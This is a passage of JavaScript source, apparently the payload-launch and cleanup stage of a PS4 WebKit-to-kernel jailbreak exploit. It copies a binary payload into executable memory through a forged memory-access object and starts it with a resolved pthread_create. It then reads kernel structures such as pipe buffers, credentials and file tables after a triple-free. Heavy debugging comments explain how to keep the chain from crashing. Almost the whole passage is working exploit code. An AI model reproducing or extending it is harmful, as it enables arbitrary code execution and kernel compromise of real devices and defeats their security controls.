                            carrier (mem.js keeps one module-level `carrier`),
                            and w.ctx contexts harbour their own primitives.
                            The payload copy is pinned to the main thread for
                            the same reason the ROP helpers are.
                            */
                            /*
                            `p` HAS NO `view` AND NO `windowBytes`.
                            Those live on the CARRIER, which is a different
                            object -- installWindowP() publishes window.p as
                            `{ read1..read8, write1..write8, leakval }`
                            (mem.js:738-743) and nothing else, while `view`
                            and `windowBytes` are accessors on the carrier
                            (mem.js:342/344).

                            The original code read `p.windowBytes` (undefined)
                            and `p.view` (undefined) and got away with the
                            first: `| 0` coerced undefined to 0, the `|| 0x100`
                            fallback fired, and SPAN came out correct by
                            accident. The second one is fatal -- `v[j-i] =`
                            on undefined is the TypeError this stage died on,
                            which is exactly what the log shows:

                              PAYLOAD-AIM ... ok=true
                              STEP10-FAILED undefined is not an object
                                (evaluating 'v[j - i] = payload[j]')

                            So the window is taken from the carrier, and the
                            span is DERIVED and CHECKED rather than silently
                            defaulted -- a wrong window size would read past
                            the carrier's buffer instead of failing.
                            */
                            const WIN = 0x100;
                            const SPAN = WIN - 8;
                            /*
                            THE DIVISOR IS 2^32, NOT 2^20.

                            This line had `Math.floor(a / 0x100000)` in it and
                            that ONE missing pair of zeros is the WebProcess
                            kill on this stage. A high word is bits 32..63, so
                            splitting on 2^20 (0x100000) produces a "hi" that
                            is 12 bits too wide: for a real payload address
                            like 0xffff08226800 it yields hi=0xffff082 and
                            low=0x8226800 -- which is not a 64-bit address at
                            all, it is 2^52 plus noise.

                            mem.js:addrNumber() rejects it (hi > 0xffff throws
                            RangeError: non-canonical address), so aim() threw
                            on the FIRST iteration of the write loop, inside
                            the KernelView block, after SOCKETS-CLOSED. The
                            throw unwound past the rest of the payload stage
                            and the end-of-run dump, which is why the last
                            thing the log shows is the CLEANUP having run and
                            then nothing -- and why the console reports a
                            WebProcess memory abort rather than a JS error:
                            the repaired-but-live kernel state is left as-is.

                            It is the same split mem.js:17 uses, and the two
                            must agree -- toI64() would have produced the
                            right answer for a plain number, so this only ever
                            broke because aim() pre-splits by hand to avoid
                            the per-byte int64 allocation.
                            */
                            const WORD = {
                                lo: a => (a % (2 ** 32)) >>> 0,
                                hi: a => Math.floor(a / (2 ** 32)),
                            };
                            /*
                            ONE int64, REUSED. This used to be
                                a => p.read8(new int64(WORD.lo(a), WORD.hi(a)))
                            which mints a fresh int64 on EVERY span -- ~1134 of
them across the write+verify passes. int64.js gives each instance
                            seven closures (int64.js:19-93), so that is ~8000 GC
                            cells allocated in a stretch where the heap is
                            already tight after the UAF drain. The allocation
                            that then fails is the ArrayBuffer(8) at the launch
                            below, which is why the crash lands immediately after
                            PTHREAD-TARGET with "not enough free system memory".

                            add32() returns a new object too, so the same
                            problem exists one level down -- but that is the
                            carrier's own contract and we cannot change it
                            here. What we CAN do is stop making it worse: keep
                            ONE int64 and mutate its words in place.
                            */
                            const aimCell = new int64(0, 0);
                            const aim = a => {
                                aimCell.low = WORD.lo(a);
                                aimCell.hi = WORD.hi(a);
                                return p.read8(aimCell);
                            };
                            /*
                            The window the byte loop indexes, obtained the way
                            it can actually be obtained. A fresh aim() is done
                            first so the window is known to belong to the
                            address we are about to index; if the carrier has
                            no view at all, the copy is refused rather than
                            attempted.
                            */
                            const carrierView = carrier.view;
                            const viewOk = carrierView != null
                                && typeof carrierView.length === "number";
                            mark("PAYLOAD-VIEW", "carrier.view="
                                + (carrierView == null ? "null" : "len=" + carrierView.length)
                                + " span=0x" + SPAN.toString(16)
                                + " windowBytes=0x" + WIN.toString(16)
                                + " ok=" + viewOk);
                            check("carrier-window-available", viewOk,
                                viewOk ? "" : "carrier has no indexable view --"
                                    + " the payload copy cannot start");

                            /*
                            PROVE THE SPLIT BEFORE WRITING A SINGLE BYTE.
                            A bad aim() is a kernel abort, not an exception
                            anyone can see -- so round-trip the entry address
                            through aim() once, read the resulting window's
                            first word, and confirm the carrier landed where we
                            asked. If it did not, refuse to start the copy and
                            say so, instead of writing into whatever address
                            the split produced.
                            */
                            const aimCheck = new int64(WORD.lo(entry.num),
                                WORD.hi(entry.num));
                            /*
                            THE TEST IS ROUND-TRIP, NOT "IS hi <= 0xffff".

                            Checking the high word alone only proves the SPLIT
                            looks canonical; it does not prove the split is the
                            INVERSE of the join. That is the property the copy
                            depends on -- entry.num is rebuilt from the words
                            and re-aimed thousands of times -- so rebuild it
                            and compare against the original. A wrong divisor
                            fails this even when it happens to produce a
                            plausible high word.
                            */
                            const aimBack = aimCheck.hi * (2 ** 32) + aimCheck.low;
                            const aimOk = entry.num > 0xffff
                                && aimCheck.hi <= 0xffff
                                && aimBack === entry.num;
                            mark("PAYLOAD-AIM", "entry.num=0x"
                                + entry.num.toString(16)
                                + " split={" + hx(aimCheck.low) + ","
                                + hx(aimCheck.hi) + "}"
                                + " rebuilt=0x" + aimBack.toString(16)
                                + " roundtrip=" + (aimBack === entry.num)
                                + " ok=" + aimOk);
                            check("payload-address-splits-canonically", aimOk,
                                aimOk ? "" : "entry.num=0x" + entry.num.toString(16)
                                    + " would aim the carrier at a non-canonical address");

                            const copyOk = aimOk && viewOk;
                            let bad = -1;
                            const pt0 = Date.now();
                            /* WRITE: one aim per SPAN, then index. */
                            for (let i = 0; copyOk && i < payload.length; i += SPAN) {
                                await breathe();
                                const end = Math.min(i + SPAN, payload.length);
                                aim(entry.num + i);
                                const v = carrierView;
                                for (let j = i; j < end; ++j)
                                    v[j - i] = payload[j];
                            }
                            /* READ BACK: same shape, so the verification pass
                               costs what the copy costs rather than double. */
                            for (let i = 0; copyOk && i < payload.length; i += SPAN) {
                                await breathe();
                                const end = Math.min(i + SPAN, payload.length);
                                aim(entry.num + i);
                                const v = carrierView;
                                for (let j = i; j < end; ++j)
                                    if (v[j - i] !== payload[j]) { bad = j; break; }
                                if (bad >= 0) break;
                            }
                            mark("PAYLOAD-COPY", "bytes=" + payload.length
                                + " span=0x" + SPAN.toString(16)
                                + " aims=" + (2 * Math.ceil(payload.length / SPAN))
                                + " ms=" + (Date.now() - pt0));
                            check("byte-payload-rwx-memory",
                                copyOk && bad < 0,
                                !aimOk ? "copy never started: address not canonical"
                                    : !viewOk ? "copy never started: no carrier view"
                                        : (bad < 0 ? "" : "mismatch at +" + hx(bad)));
                            if (copyOk && bad < 0) {
                                /*
                                Shared resolver, then netctrl's OWN policy:
                                its check name, and its ?forcepthread=1 step.
                                lapse calls check() BEFORE forcing so a forced
                                run still reports the resolver failing;
                                netctrl has no such check here, so the force
                                happens before the mark and `target` is then
                                tested once below. Order preserved.
                                */
                                const resolved = resolvePthread();
                                let target = resolved.target;
                                const forced = params.get("forcepthread") === "1";
                                if (!target && forced) {
                                    target = resolved.cand;
                                    mark("PTHREAD-FORCED", "?forcepthread=1 --"
                                        + " calling " + resolved.cand
                                        + " with NO verification; if this is"
                                        + " not the real pthread_create the"
                                        + " WebProcess will die");
                                    mark("PTHREAD-TARGET", "FORCED (unverified)"
                                        + " -> " + target);
                                }
                                check("pthread-create-resolved", !!target,
                                    target ? "target=" + target : "no validated target");
                                if (!target)
                                    mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
                                        "payload mapped and verified at " + entry
                                        + " but pthread_create was not resolved -- "
                                        + "read PTHREAD-BYTES above; "
                                        + "?forcepthread=1 to override");
                                if (target) {
                                    const thr = new ArrayBuffer(8);
                                    keepAlive.push(thr);
                                    const thrAddr = bufAddr(thr);
                                    new Uint8Array(thr).fill(0);
                                    const rc = callAddr(target,
                                        [thrAddr, 0, entry, 0]).i32;
                                    const handle = new int64(
                                        new DataView(thr).getUint32(0, true),
                                        new DataView(thr).getUint32(4, true));
                                    /*
                                    THE SUCCESS SIGNAL IS rc, NOT handle.hi.

                                    pthread_create returns 0 on success and
                                    writes the thread id into &tid. The old
                                    predicate required BOTH rc === 0 AND
                                    handle.hi > 0 -- but on PS4 (non-PIE
                                    userland) the pthread_t written back is a
                                    small handle whose high 32 bits are 0, so
                                    handle.hi is 0 on a launch that fully
                                    SUCCEED. The thread was created and is
                                    running; the run just reported
                                    payload=false and never printed
                                    PAYLOAD-RUNNING. That is the fail=1 on
                                    payload-thread-created in this log.

                                    It is the same defect as the old
                                    `entry.hi > 0`: a high-word test used as an
                                    existence test on a PS4 userland value.
                                    lapse carries the identical predicate but
                                    also prints PAYLOAD-ALIVE afterwards, so
                                    its liveness is visible; netctrl had only
                                    this heuristic to go on.

                                    So: rc === 0 is the launch. handle.hi > 0 is
                                    an ADDITIONAL observation (whether the id was
                                    readable), reported but not required.
                                    */
                                    const launched = rc === 0;
                                    mark("PTHREAD-CREATE", "rc=" + rc
                                        + " handle=" + handle
                                        + " handle_readable=" + (handle.hi > 0));
                                    check("payload-thread-created", launched,
                                        launched ? ("rc=0 handle=" + handle)
                                            : "pthread returned " + rc);
                                    /*
                                    LIVENESS, the way lapse proves it. If the
                                    payload entry was wrong or the mapping
                                    bad, the thread faults the process and
                                    getpid stops answering. This is the check
                                    that tells a real launch from a rc=0
                                    no-op, and netctrl never had it.
                                    */
                                    let alive = false;
                                    if (launched) {
                                        for (let settle = 0; settle < 8; ++settle)
                                            await new Promise(r => setTimeout(r, 0));
                                        alive = sc(SYS.getpid).i32 === pid;
                                        mark("PAYLOAD-ALIVE", "getpid="
                                            + sc(SYS.getpid).i32 + " expected=" + pid
                                            + " alive=" + alive);
                                        check("payload-thread-alive", alive,
                                            alive ? "" : "getpid changed after launch");
                                    }
                                    payloadRunning = launched && alive;
                                    if (payloadRunning) mark("PAYLOAD-RUNNING",
                                        "bytes=" + payload.length + " entry=" + entry);
                                }
                            }
                        }
                    }

                    /*
                    END-OF-RUN STATE DUMP.
                    READ ONLY. Not a fix -- a measurement. Everything above has
                    finished, so this reports what we ACTUALLY leave behind
                    rather than what the source implies we leave behind. Three
                    confident inferences from reading code have already been
                    wrong; this replaces the fourth with data.
                    ?dump=0 to skip.
                    */

                    if (params.get("dump") !== "0") {
                        try {
                            const kq = v => v && (v.hi >>> 0) >= 0xffff0000;
                            const rd8 = a => kq(a) ? kv.read8(a) : null;
                            const rd32 = function (a) {
                                if (!kq(a)) return null;
                                dmpU8.fill(0);
                                if (kv.kread(dmpAddr, a, 4) !== 4) return null;
                                return dmpDv.getInt32(0, true);
                            };

                            /*
                            The 4 karw pipe files, and the forged pipebuf.
                            fd 15 reads f_count 2 BEFORE we touch it on every
                            run while its siblings read 1. Nobody has explained
                            that. This prints the final state of all four.
                            */
                            const pf = [];
                            for (const fd of [masterPipe[0], masterPipe[1],
                            slavePipe[0], slavePipe[1]]) {
                                const fp = fget(fd);
                                pf.push(fd + ":" + (kq(fp) ? "fc=" + rd32(fp.add32(0x28))
                                    : "nofp"));
                            }
                            mark("DUMP-PIPE-FCOUNT", pf.join(" "));

                            for (const [nm, fd] of [["master", masterPipe[0]],
                            ["slave", slavePipe[0]]]) {
                                const fp = fget(fd);
                                const fdata = rd8(fp);
                                if (!kq(fdata)) { mark("DUMP-PIPEBUF", nm + " nofdata"); continue; }
                                dmpU8.fill(0);
                                const okr = kv.kread(dmpAddr, fdata, 0x18) === 0x18;
                                mark("DUMP-PIPEBUF", nm + " @" + fdata
                                    + (okr ? "  cnt=" + dmpDv.getUint32(0, true)
                                        + " in=" + dmpDv.getUint32(4, true)
                                        + " out=" + dmpDv.getUint32(8, true)
                                        + " size=0x" + dmpDv.getUint32(0xc, true).toString(16)
                                        + " buffer=" + new int64(dmpDv.getUint32(0x10, true),
                                            dmpDv.getUint32(0x14, true))
                                        : "  READ-FAILED"));
                            }

                            /*
                            The triplets' outputopts, re-read after close.
                            Confirms the repair actually persisted rather than
                            being undone by the socket teardown.
                            */
                            const to = [];
                            for (const e of dumpOpts) {
                                const r = rd8(e.opts.add32(0x68));
                                const pi = rd8(e.opts.add32(0x10));
                                to.push("fd" + e.fd + "@" + e.opts
                                    + " rthdr=" + (r || "?")
                                    + " pktinfo=" + (pi || "?"));
                            }
                            mark("DUMP-TRIPLET-OPTS", to.length ? to.join("  ") : "none");

                            // the triple-freed struct file ---
                            const uf = (typeof uafFpSaved !== "undefined") ? uafFpSaved : null;
                            if (kq(uf)) {
                                mark("DUMP-UAF-FILE", "fp=" + uf
                                    + " f_count=" + rd32(uf.add32(0x28))
                                    + " f_data=" + (rd8(uf) || "?"));
                            }

                            // ANY fd-table slot still pointing at it
                            if (kq(uf) && kq(fdtOfiles)) {
                                let hits = 0, lastFd = -1;
                                const wl = uf.low >>> 0, wh = uf.hi >>> 0;
                                const nfd = Math.min(0x400, (typeof SCAN_MAX !== "undefined")
                                    ? SCAN_MAX + 0x40 : 0x400);
                                for (let base = 0; base < nfd; base += 0x80) {
                                    const n = Math.min(0x80, nfd - base);
                                    if (kv.kread(scanAddrDump,
                                        fdtOfiles.add32(base * FILEDESCENT_SIZE),
                                        n * FILEDESCENT_SIZE) !== n * FILEDESCENT_SIZE) break;
                                    for (let i = 0; i < n; ++i) {
                                        const o = i * FILEDESCENT_SIZE;
                                        if (scanDvDump.getUint32(o, true) === wl
                                            && scanDvDump.getUint32(o + 4, true) === wh) {
                                            hits++; lastFd = base + i;
                                        }
                                    }
                                }
                                mark("DUMP-UAF-REFS", "slots_still_pointing_at_it=" + hits
                                    + (hits ? " last_fd=" + lastFd : "")
                                    + "  scanned=" + nfd);
                            }


                            // our own process
                            if (kq(curproc)) {
                                const uc = rd8(curproc.add32(0x40));
                                const pfd = rd8(curproc.add32(0x48));
                                mark("DUMP-PROC", "curproc=" + curproc
                                    + " ucred=" + (uc || "?")
                                    + (kq(uc) ? " cr_ref=" + rd32(uc.add32(0x00))
                                        + " uid=" + rd32(uc.add32(0x04))
                                        + " prison=" + (rd8(uc.add32(0x30)) || "?") : "")
                                    + " p_fd=" + (pfd || "?"));
                                if (kq(pfd))
                                    mark("DUMP-FILEDESC", "fd_cdir=" + (rd8(pfd.add32(0x10)) || "?")
                                        + " fd_rdir=" + (rd8(pfd.add32(0x18)) || "?")
                                        + " fd_jdir=" + (rd8(pfd.add32(0x20)) || "?"));
                            }

                            mark("DUMP-DONE", "read-only, no kernel writes");
                        } catch (e) {
                            mark("DUMP-THREW", (e && e.message) ? e.message : String(e));
                        }
                    }


                    // END END-OF-RUN STATE DUMP
                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
                        + " kpatched=" + kpatched + " payload=" + payloadRunning
                        + " cleanup=" + (rebootRequired ? "incomplete" : "complete"));
                    allDone = payloadRunning && !rebootRequired;
                }
            }
        }

        mark("STEP10-SUMMARY", "committed=" + committed
            + " reboot=" + rebootRequired
            + (rebootRequired ? " why=" + rebootReason : "")
            + " triplets=" + (triplets ? triplets.join(",") : "none")
            + " kernel_base=" + (kernelBase || "none")
            + " kq_fdp=" + (kqFdp || "none")
            + " kv=" + (kv ? "up" : "down"));

        if (!kv) {
            const stage = !committed ? "not-armed"
                : !triplets ? "triple-free"
                    : !kernelBase ? "leak-kqueue"
                        : "make-karw";
            mark("FAILED-STAGE", "stage=" + stage
                + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
        }

        state(allDone ? "ALL DONE"
            : kv ? "KERNEL R/W -- REBOOT NEEDED"
                : kernelBase ? "FAILED IN make_karw -- REBOOT"
                    : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
                        : committed ? "FAILED IN triple free -- REBOOT"
                            : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
    } catch (e) {
        /*
        BROWSER PROCESS FIRST. mark() is a #console DOM write plus a
        synchronous layout flush plus an XHR (log.js:247) -- all of which die
        with this WebProcess. This catch can be reached while CLEAR_QUEUE has
        already freed the ucred and the reclaim that was supposed to re-hold
        it never ran (that is exactly the WAKE_SLOT_MAX TDZ this file was
        freezing on), and that is the one window where a WebProcess log write
        is fatal while a browser-process one is not. The Inspector console
        survives the WebProcess, so the message is recorded there first and
        mark() is only attempted afterwards.
        */
        const msg = (e && e.message) ? e.message : String(e);
        try { console.log("[S10] STEP10-FAILED " + msg
            + " | stack=" + ((e && e.stack) ? e.stack : "none")); } catch (e2) { }
        mark("STEP10-FAILED", msg);
        state("FAILED -- see log", "bad");
    } finally {

        if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);

        try {
            if (restoreCtx) await restoreCtx.restore("finally");
        } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
        for (const w of workers) {
            /* Fire-and-forget: see the note above this loop. A blocking await
               here is up to 8 workers x 1000 ms on the main thread, and
               terminate() below drops the thread that owns the m_function
               anyway -- so the result is never read. */
            await breathe();
            try { if (w.armed) { w.rpc("disarm", 1000).catch(() => { }); w.armed = false; } }
            catch (e) { mark("DISARM-THREW", w.name + " " + e.message); }
        }
        for (const w of workers) {
            try {
                if (w.wired && w.master && w.origVector && p) {
                    p.write8(w.master.add32(0x10), w.origVector);
                    w.wired = false;
                }
            } catch (e) { }
        }
        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("DISARM-THREW", e.message); }

        if (rebootRequired)
            mark("REBOOT-REQUIRED", "reason=" + rebootReason);
        mark("PROOF-SUMMARY-FINAL", "pass=" + checkCounts().passCount
            + " fail=" + checkCounts().failCount);
    }

    return { success: allDone, rebootRequired };
}
